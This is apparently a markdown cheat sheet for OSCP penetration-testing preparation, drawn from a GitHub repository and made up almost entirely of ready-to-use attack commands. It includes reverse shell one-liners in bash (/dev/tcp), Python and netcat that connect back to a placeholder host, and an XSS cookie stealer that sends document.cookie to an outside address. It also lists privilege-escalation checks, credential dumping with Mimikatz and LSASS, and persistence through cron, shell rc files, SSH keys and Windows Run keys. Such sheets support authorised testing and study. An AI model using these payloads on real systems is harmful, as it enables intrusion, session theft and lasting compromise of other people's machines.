# Gabb4r Command Reference

**Source:** [gabb4r/OSCP](https://github.com/gabb4r/OSCP)

## Network Tools

### Netcat
- Listen: `nc -lvnp <PORT>`
- Connect: `nc -nv <IP> <PORT>`
- Reverse shell: `nc -e /bin/bash <IP> <PORT>`
- File transfer: `nc -lvnp <PORT> < file.txt`

### SSH Tunneling
- Local forward: `ssh -L <LOCAL_PORT>:127.0.0.1:<REMOTE_PORT> user@<IP>`
- Remote forward: `ssh -R <REMOTE_PORT>:127.0.0.1:<LOCAL_PORT> user@<IP>`
- SOCKS: `ssh -D 9050 user@<IP>`

### Shell Upgrading
- Python TTY: `python3 -c 'import pty; pty.spawn("/bin/bash")'`
- script: `script /dev/null -c bash`

## Information Gathering

### Nmap
- Basic: `nmap -sV -sC -O <IP>`
- All ports: `nmap -p- <IP>`
- UDP: `nmap -sU <IP>`
- Output: `nmap -oA scan <IP>`

### DNS Enumeration
- Zone transfer: `dig @<DNS> <DOMAIN> axfr`
- Reverse: `dig -x <IP>`

### SMB
- enum4linux: `enum4linux -a <IP>`
- smbclient: `smbclient -L //<IP>/ -U user%pass`
- rpcclient: `rpcclient -U user%pass <IP>`

### LDAP
- Users: `ldapsearch -x -h <IP> -b 'DC=domain,DC=com' 'objectClass=user' sAMAccountName`
- Groups: `ldapsearch -x -h <IP> -b 'DC=domain,DC=com' 'objectClass=group'`

## Exploitation

### Reverse Shells

**Bash:**
`bash -i >& /dev/tcp/<IP>/<PORT> 0>&1`

**Python:**
`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'`

**Netcat:**
`nc -e /bin/bash <IP> <PORT>`

### XSS Payloads
- Basic: `<script>alert('XSS')</script>`
- IMG: `<img src=x onerror=alert('XSS')>`
- SVG: `<svg onload=alert('XSS')>`
- Cookie stealer: `<script>new Image().src='http://<IP>/?c='+document.cookie;</script>`

## Post-Exploitation

### Linux Privilege Escalation
- Kernel: `uname -a` ? searchsploit
- SUID: `find / -perm -u=s -type f 2>/dev/null`
- sudo: `sudo -l`
- Capabilities: `getcap -r / 2>/dev/null`
- Cron: `crontab -l`, `cat /etc/cron*`

### Windows Privilege Escalation
- Kernel: `systeminfo`, `wmic qfe list`
- Services: `wmic service list` ? unquoted paths, DLL hijacking
- Registry: AlwaysInstallElevated, Windows Defender disable
- Tokens: Incognito, printspoofer, juicypotato
- UAC: UACMe, Fodhelper
- Credentials: Mimikatz, LSASS dump

### Persistence

**Linux:**
- Cron: `crontab -e`
- Shell RC: ~/.bashrc, /etc/profile
- SSH keys: ~/.ssh/authorized_keys

**Windows:**
- Scheduled task: `schtasks /create /tn name /tr cmd /sc onlogon`
- Registry: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
- Startup: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup

## Password Cracking
- John: `john --wordlist=rockyou.txt hashes.txt`
- hashcat: `hashcat -m 1000 hashes.txt rockyou.txt`
- Hydra: `hydra -l user -P rockyou.txt <IP> ssh`
